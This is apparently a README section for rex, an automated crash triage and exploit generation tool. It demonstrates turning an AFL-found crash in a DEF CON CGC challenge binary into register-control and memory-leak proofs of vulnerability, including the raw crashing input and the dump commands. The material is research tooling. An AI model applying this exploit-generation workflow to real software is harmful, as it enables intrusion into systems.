### Rex

At the moment rex offers a couple of features, crash triaging, crash exploration, and exploitation for certain kinds of crashes.

In the example below, we take a crashing input for `legit_00003` discovered by AFL. The vulnerability is a simple buffer overflow on the stack, however, before the vulnerable returns it calls memcpy with a destination parameter which was overwritten during the stack smash.
While Rex doesn't know how to exploit an arbitrary memcpy call (yet), it can be told to explore the crash until it finds an exploitation primitive which it knows how to exploit.

Exploit objects can take an crashing input and will attempt to turn it into an exploit which can set every register and leak data from an arbitrary address.

```python
# triage a crash
>>> crash = rex.Crash("../binaries-private/defcon24/legit_00003", "\x00\x0b1\xc1\x00\x0c\xeb\xe4\xf1\xf1\x14\r\rM\r\xf3\x1b\r\r\r~\x7f\x1b\xe3\x0c`_222\r\rM\r\xf3\x1b\r\x7f\x002\x7f~\x7f\xe2\xff\x7f\xff\xff\x8b\xc7\xc9\x83\x8b\x0c\xeb\x80\x002\xac\xe2\xff\xff\x00t\x8bt\x8bt_o_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff_k_\x00t\x8b\xc7\xdd\x83\xc2t~n~~\xac\xe2\xff\xff\x00t\x8bt\x8b\xac\xf1\x83\xc2t~c\x00\x00\x00~~\x7f\xe2\xff\xff\x00t\x9e\xac\xe2\xf1\xf2@\x83\xc3t")
>>> crash.crash_type
'write_what_where'
>>> crash.explorable()
True
# explore the crash by setting segfaulting pointers to sane values and re-tracing
>>> crash.explore()
# now we can see that we control instruction pointer
>>> crash.crash_type
'ip_overwrite'
# generate exploits based off of this crash
>>> arsenal = crash.exploit()
# we generated a type 1 POV for every register
>>> arsenal.register_setters.keys()
['esp', 'edi', 'eax', 'ebp', 'edx', 'ebx', 'esi', 'ecx']
# and one Type 2 which can leak arbitrary memory
>>> len(arsenal.leakers)
1
# exploits are graded based on reliability, and what kind of defenses they can
# bypass
>>> arsenal.best_type1.register
'esi'
# exploits can be dumped in C, Python, or as a compiled POV
>>> arsenal.best_type2.dump_c('legit_x.c')
>>> arsenal.best_type2.dump_python('legit_x.py')
>>> arsenal.best_type2.dump_binary('legit_x.pov')
# also POVs can be tested against a simulation of the CGC architecture
>>> arsenal.best_type1.test_binary()
True
```
